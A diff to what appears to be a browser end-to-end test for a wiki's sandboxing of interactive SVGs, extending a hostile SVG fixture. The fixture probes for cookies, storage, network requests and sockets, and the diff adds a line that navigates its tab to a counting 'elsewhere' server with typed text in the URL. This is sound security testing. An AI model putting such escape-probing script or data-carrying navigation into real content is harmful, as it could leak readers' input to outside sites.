@@ -73,12 +73,14 @@
 //    which a worker's requests and its cache's answers do not.
 // 9. Interactive SVGs (WP5.90): SVG attachments of a private space's page,
 //    embedded with {.interactive}, in frames the server prerenders and the
-//    program adopts without loading any again; a click in a flame graph's
-//    shape runs its script; a hostile SVG, in its frame and alone in a tab,
-//    finds no cookie, no storage, no way into the page, no request to the
-//    wiki or another site, no tab and no dialog; one that navigates its
-//    frame to the wiki's API arrives there signed out; nothing reaches the
-//    other site.
+//    program adopts without loading any again, and which the program makes
+//    itself in the editor's preview and the page after it, loading each
+//    once; a click in a flame graph's shape runs its script; a hostile SVG,
+//    in its frame and alone in a tab, finds no cookie, no storage, no way
+//    into the page, no request to the wiki or another site, no tab and no
+//    dialog, and alone in its tab can only take the tab elsewhere; one that
+//    navigates its frame to the wiki's API arrives there signed out; the
+//    frames load with the service worker on too.
 //
 // On PostgreSQL (toolchain/smoke-test.sh runs it so when one is at hand),
 // the server and the console find their database in WIKI_DATABASE_URL, which
@@ -466,8 +468,10 @@ const pageAt = async (spacePath, slug) => {
 // An SVG that tries every way out of its frame and writes what happened
 // into its own text, which the test reads through Playwright's frame API,
 // since the SVG cannot tell the page. The other site is the address of a
-// server that counts what reaches it. Opened by itself in a tab, it does
-// not navigate its own tab, which any page may do.
+// server that counts what reaches it. Opened by itself in a tab with
+// &leave, it then takes its tab to the other site with what a reader might
+// have typed into it: a page may always navigate itself, and no policy
+// stops it.
 const hostileSvg = (elsewhere) => `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200" onload="tryAll()">
 <script><![CDATA[
 var told = {};
@@ -513,7 +517,10 @@ function tryAll() {
       } catch (e) { tell("socket", "threw " + e.name); done(); }
     })
   ];
-  Promise.all(waits).then(function () { tell("done", true); });
+  Promise.all(waits).then(function () {
+    tell("done", true);
+    if (!framed && location.search.indexOf("leave") >= 0) setTimeout(function () { location.href = "${elsewhere}/left?typed=" + encodeURIComponent("what the reader typed"); }, 100);
+  });
 }
 ]]></script>
 <text id="report" x="4" y="16" font-size="10">not run</text>
@@ -641,12 +648,31 @@ async function interactiveSvgs() {
     await page.waitForTimeout(300);
     assert.deepEqual([...loads.values()], [1, 1, 1], `the frames' loads: ${JSON.stringify([...loads])}`);
 
+    // The frames made by the program rather than the server, which the
+    // island gives their address: in the editor's preview, then in the
+    // page reached from the editor. Each shown once is loaded once.
+    const flameIn = (frames) => frames.frameLocator("iframe.wiki-svg[title='Where the time goes']").locator("#status");
+    await page.locator("#app .page-actions a[href$='/profiles/edit/']").click();
+    await page.locator(editorText).waitFor({ timeout });
+    await page.locator("#app .editor-show-preview").click();
+    await eventually(async () => assert.equal(await flameIn(page.locator("#app .editor-preview")).textContent(), "ready"), "the flame graph's script in the editor's preview");
+    await eventually(async () => assert.deepEqual([...loads.values()], [2, 2, 2]), "the frames loaded once each in the editor's preview");
+    // Back to the Markdown, which the preview's entry of the history
+    // replaced, and out of the editor to the page.
+    await page.goBack();
+    await page.locator(editorText).waitFor({ timeout });
+    await page.locator("#app .editor-cancel").click();
+    await page.locator("#app .page-view .page-body .svg-frame").first().waitFor({ timeout });
+    await eventually(async () => assert.equal(await flameIn(page.locator("#app .page-view")).textContent(), "ready"), "the flame graph's script in the page reached from the editor");
+    await page.waitForTimeout(300);
+    assert.deepEqual([...loads.values()], [3, 3, 3], `the frames' loads after the editor and the page: ${JSON.stringify([...loads])}`);
+
     // The same address opened by itself in a tab of the signed-in browser:
     // no better off.
     const tab = await page.context().newPage();
     const tabDialogs = [];
     tab.on("dialog", (dialog) => tabDialogs.push(dialog.message()));
-    await tab.goto(url(framed(hostile)));
+    await tab.goto(url(`${framed(hostile)}&leave`));
     const alone = await reportOf(tab.mainFrame());
     assert.equal(alone.framed, "false");
     assert.equal(alone.origin, "null", "the tab's origin");
@@ -656,12 +682,28 @@ async function interactiveSvgs() {
     assert.match(alone.fetchWiki, /^failed/, "the wiki's API, from the tab");
     assert.match(alone.fetchElsewhere, /^failed/, "another site, from the tab");
     assert.deepEqual(tabDialogs, [], "a dialog shown in the tab");
+    // Alone in its tab it can take the tab elsewhere, as any page can, with
+    // what its script holds: never anything of the wiki's.
+    await eventually(async () => assert.ok(tab.url().startsWith(elsewhereOrigin), tab.url()), "the tab taken elsewhere");
     await tab.close();
     await page.context().close();
-    // Neither the frame nor the tab reached the other site: no request, no
-    // image, no beacon, no form, no popup, no navigation.
-    assert.deepEqual(reached, [], "what reached another site");
-    console.log("ok: interactive SVGs of a private space run their scripts in frames the server prerenders and the program adopts without loading them again, and reach nothing: no cookie, no storage, no page, no request, no tab, no dialog, in a frame or alone in a tab");
+
+    // With the service worker on, as a reader's browser has it, the frame
+    // of a private space's SVG loads and runs, with the session's cookie.
+    const workerContext = await browser.newContext();
+    await workerContext.addCookies([{ name: "wiki_session", value: sessionToken, url: origin }]);
+    const workerPage = await workerContext.newPage();
+    workerPage.on("pageerror", (error) => failures.push(`page error at ${workerPage.url()}: ${error.message}`));
+    await workerPage.goto(url(path));
+    await eventually(async () => assert.ok(await workerPage.evaluate(() => navigator.serviceWorker.controller !== null), "no worker"), "the service worker taking the page over");
+    await workerPage.goto(url(path));
+    await eventually(async () => assert.equal(await flameIn(workerPage.locator("#app .page-view")).textContent(), "ready"), "the flame graph under the service worker");
+    await workerContext.close();
+
+    // Neither a frame nor the tab reached the other site but by that
+    // navigation: no request, no image, no beacon, no form, no popup.
+    assert.deepEqual(reached, [`/left?typed=${encodeURIComponent("what the reader typed")}`], "what reached another site");
+    console.log("ok: interactive SVGs of a private space run their scripts in frames the server prerenders and the program adopts without loading them again, and the island loads once each in the editor's preview and the page; they reach nothing: no cookie, no storage, no page, no request, no tab, no dialog, in a frame or alone in a tab, where they can only take the tab elsewhere; the frame loads with the service worker on too");
   } finally {
     elsewhere.close();
   }
